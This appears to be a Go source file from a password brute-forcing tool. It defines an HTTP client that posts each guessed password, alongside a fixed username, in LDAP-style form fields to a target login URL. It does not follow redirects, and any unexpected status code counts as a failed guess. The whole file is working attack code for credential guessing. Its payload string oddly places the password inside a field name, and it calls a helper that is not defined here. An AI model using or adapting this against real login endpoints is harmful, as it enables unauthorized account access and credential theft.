package main

import (
	"fmt"
	"net/http"
	"strings"
)

type NetHttpBrute struct {
	Verb               string
	Url                string
	Username           string
	expectedStatusCode int
	Headers            map[string]string
}

func NewHttpBrute(verb, url, username string, expectedStatusCode int,
	headers map[string]string) *NetHttpBrute {
	return &NetHttpBrute{
		Url:                url,
		Verb:               strings.ToUpper(verb),
		Username:           username,
		expectedStatusCode: expectedStatusCode,
		Headers:            headers,
	}
}

func (c *NetHttpBrute) Do(password string) error {
	payload := fmt.Sprintf("1_ldap-username=%s&1_ldap-secret%s0=[{}, \"$K1\"]", c.Username, password)
	req, err := http.NewRequest(c.Verb, c.Url, strings.NewReader(payload))
	if err != nil {
		return err
	}

	for k, v := range c.Headers {
		req.Header.Set(k, v)
	}

	//Dont follow redirects
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		return err
	}

	defer resp.Body.Close()

	if c.expectedStatusCode != resp.StatusCode {
		return NewPasswordErrorWithCode(fmt.Errorf("invalid Password: %s", password), resp.StatusCode)
	}
	return nil
}
